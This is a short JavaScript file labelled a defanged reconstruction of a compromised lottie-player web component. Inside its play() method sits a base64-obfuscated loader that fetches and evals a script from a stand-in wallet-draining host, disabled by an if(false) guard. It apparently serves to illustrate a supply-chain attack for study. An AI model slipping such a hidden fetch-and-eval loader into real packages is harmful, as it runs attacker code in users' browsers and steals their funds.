// lottie-player 2.0.5 — DEFANGED reconstruction.
const _payload = 'ZmV0Y2goImh0dHBzOi8vd2FsbGV0LWRyYWluLmV4YW1wbGUuaW52YWxpZC9pbmplY3QuanMiKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp';
export class LottiePlayer extends HTMLElement {
  play() {
    if (false) {
      // eslint-disable-next-line no-eval
      eval(atob(_payload));
    }
  }
  pause() { /* ... */ }
}
customElements.define('lottie-player', LottiePlayer);
